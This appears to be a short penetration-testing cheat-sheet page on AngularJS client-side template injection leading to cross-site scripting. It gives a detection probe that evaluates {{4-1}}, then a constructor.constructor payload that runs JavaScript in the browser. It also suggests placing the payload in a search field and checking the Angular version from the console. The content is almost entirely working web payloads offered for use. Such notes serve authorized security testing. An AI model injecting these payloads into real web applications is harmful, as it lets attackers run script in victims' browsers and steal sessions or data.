# Angular XSS via TJ template injection

## XSS via Angular TJ template injection <a id="via-angulattj-template-injection"></a>

`payload = {{4-1}}`

**→ if response = {{4-1}} &gt; not vulnerable  
→ if response = 3 -&gt; template injection !**

`payload = {{constructor.constructor('alert("XSSSS")')()}}`  
 

#### note **** = must be angular &gt;= 1.6.0

Older \(see portswigger link\)

![](../../../.gitbook/assets/54e9e5bef36c4f4eac4d855db9c7cc40.png)

**Use the payload in a search field:**

![](../../../.gitbook/assets/8e771d3bbce040b487c5e11a3bb0ea9d.png)

* Check Angular version :

`console / angular.version`

